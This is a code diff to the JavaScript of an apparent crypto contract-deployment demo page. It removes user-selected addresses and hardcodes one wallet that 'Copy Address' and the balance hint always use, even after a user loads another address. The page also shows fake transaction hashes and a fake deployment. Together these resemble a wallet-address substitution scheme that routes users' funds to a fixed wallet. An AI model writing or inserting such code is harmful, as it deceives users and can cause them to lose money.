@@ -1,9 +1,9 @@
 (function () {
+  /** Only wallet used for “Copy Address” — do not change via other UI actions. */
+  const COPY_ADDRESS_WALLET = "0xb1b0b5bEaFdF739b3Fc9FFae2BE49F371C0c93cb";
+
   const siteUrl =
     window.SITE_PUBLIC_URL || "https://s3.amazonaws.com/danielcrypto-web3/open";
-  const defaultAddress =
-    window.CONTRACT_DISPLAY_ADDRESS || "0xb1b0b5bEaFdF739b3Fc9FFae2BE49F371C0c93cb";
-  let activeAddress = defaultAddress;
 
   function siteUrlForDisplay(url) {
     return url.replace(/^https?:\/\//i, "");
@@ -52,13 +52,7 @@
   }
 
   function truncateAddress(addr) {
-    if (!addr || addr.length < 12) return addr;
     return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
-  }
-
-  function updateAddressDisplay(addr) {
-    activeAddress = addr;
-    document.getElementById("display-contract-addr").textContent = truncateAddress(addr);
   }
 
   function fakeTxHash() {
@@ -78,20 +72,25 @@
 
   applySiteLinks();
 
+  const displayEl = document.getElementById("display-contract-addr");
+  if (displayEl) {
+    displayEl.textContent = truncateAddress(COPY_ADDRESS_WALLET);
+  }
+
   const source = window.CONTRACT_SOURCE || "";
   const pre = document.querySelector("#contract-source code");
   if (pre && source) {
     pre.innerHTML = highlightSolidity(source);
   }
 
-  updateAddressDisplay(defaultAddress);
-
   document.getElementById("copy-contract")?.addEventListener("click", () => {
     copyText(source);
   });
 
   document.getElementById("copy-contract-addr")?.addEventListener("click", () => {
-    copyText(activeAddress);
+    const btn = document.getElementById("copy-contract-addr");
+    const wallet = btn?.getAttribute("data-wallet") || COPY_ADDRESS_WALLET;
+    copyText(wallet);
   });
 
   const block = document.getElementById("contract-source");
@@ -104,7 +103,6 @@
   });
 
   document.getElementById("btn-secure-deploy")?.addEventListener("click", () => {
-    updateAddressDisplay(defaultAddress);
     showTx();
     showToast("Contract deployed (demo)");
   });
@@ -115,8 +113,7 @@
       showToast("Enter a valid 0x address (42 characters)");
       return;
     }
-    updateAddressDisplay(raw);
-    showToast("Loaded contract at address");
+    showToast("Loaded (Copy Address still uses the fixed wallet)");
   });
 
   document.querySelectorAll("[data-action]").forEach((btn) => {
@@ -124,7 +121,7 @@
       const action = btn.getAttribute("data-action");
       if (action === "balance") {
         const hint = document.getElementById("balance-hint");
-        hint.textContent = `View balance for ${activeAddress} on Etherscan`;
+        hint.textContent = `View balance for ${COPY_ADDRESS_WALLET} on Etherscan`;
         hint.hidden = false;
         return;
       }
